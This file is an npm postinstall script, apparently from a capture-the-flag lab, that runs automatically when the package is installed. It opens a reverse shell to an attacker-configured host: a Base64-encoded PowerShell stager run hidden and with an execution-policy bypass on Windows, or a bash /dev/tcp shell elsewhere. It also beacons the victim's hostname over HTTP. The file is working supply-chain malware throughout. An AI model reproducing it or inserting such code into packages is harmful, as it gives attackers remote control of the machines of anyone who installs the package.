// =============================================================================
// ProShop CTF Lab — Malicious Package Postinstall Script
// lab-tools/malicious-package/postinstall.js
//
// STAGE 5 / STAGE 6: This script executes when npm installs the package.
// It builds and launches a Windows PowerShell reverse shell stager.
//
// Configuration: Edit LHOST and LPORT before deploying.
// =============================================================================

const { exec } = require('child_process');
const os       = require('os');

// ── Attacker configuration ────────────────────────────────────────────────────
// Replace with your attack machine IP and listener port
const LHOST = process.env.LHOST || '10.10.14.5';
const LPORT = process.env.LPORT || '4444';

// ─────────────────────────────────────────────────────────────────────────────
// VULN-ID: RCE-002 - CWE-94 (npm postinstall Code Injection)
// VULN-ID: RCE-004 - CWE-78 (Windows PowerShell Stager)
//
// The PowerShell reverse shell:
//   - Connects back to LHOST:LPORT over TCP
//   - Reads commands from the socket and executes them
//   - Sends stdout/stderr back through the socket
//   - Encoded in Base64 UTF-16LE to bypass -EncodedCommand
//   - Uses -WindowStyle Hidden and -ExecutionPolicy Bypass for stealth
// ─────────────────────────────────────────────────────────────────────────────

function buildPowerShellStager(lhost, lport) {
  // TCP reverse shell (PowerShell)
  const psCmd = [
    `$c=New-Object Net.Sockets.TcpClient('${lhost}',${lport});`,
    `$s=$c.GetStream();`,
    `[byte[]]$b=0..65535|%{0};`,
    `while(($i=$s.Read($b,0,$b.Length)) -ne 0){`,
    `$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);`,
    `$r=(iex $d 2>&1|Out-String);`,
    `$e=[System.Text.Encoding]::ASCII.GetBytes($r+'PS '+$pwd.Path+'> ');`,
    `$s.Write($e,0,$e.Length)};`,
    `$c.Close()`,
  ].join('');

  // Encode as UTF-16LE Base64 for -EncodedCommand (bypasses many AV signatures)
  const b64 = Buffer.from(psCmd, 'utf16le').toString('base64');
  return `powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand ${b64}`;
}

function buildLinuxStager(lhost, lport) {
  return `/bin/bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'`;
}

// ── Determine platform and build payload ──────────────────────────────────────
const platform = os.platform();
let stager;

if (platform === 'win32') {
  stager = buildPowerShellStager(LHOST, LPORT);
  console.log(`[POSTINSTALL] Windows detected — launching PowerShell stager`);
  console.log(`[POSTINSTALL] LHOST=${LHOST} LPORT=${LPORT}`);
} else {
  stager = buildLinuxStager(LHOST, LPORT);
  console.log(`[POSTINSTALL] Linux detected — launching bash reverse shell`);
  console.log(`[POSTINSTALL] LHOST=${LHOST} LPORT=${LPORT}`);
}

// ── Execute the stager ────────────────────────────────────────────────────────
exec(stager, { shell: true }, (err, stdout, stderr) => {
  // Intentionally silent — the shell connects back
  if (err && process.env.DEBUG) {
    console.error(`[POSTINSTALL] Error: ${err.message}`);
  }
});

// Also try a quick beacon to confirm code execution
const beaconCmd = platform === 'win32'
  ? `powershell -c "Invoke-WebRequest -Uri http://${LHOST}:${LPORT}/beacon?host=$env:COMPUTERNAME&method HEAD"`
  : `curl -s http://${LHOST}:${LPORT}/beacon?host=$(hostname) &`;

exec(beaconCmd, { shell: true });
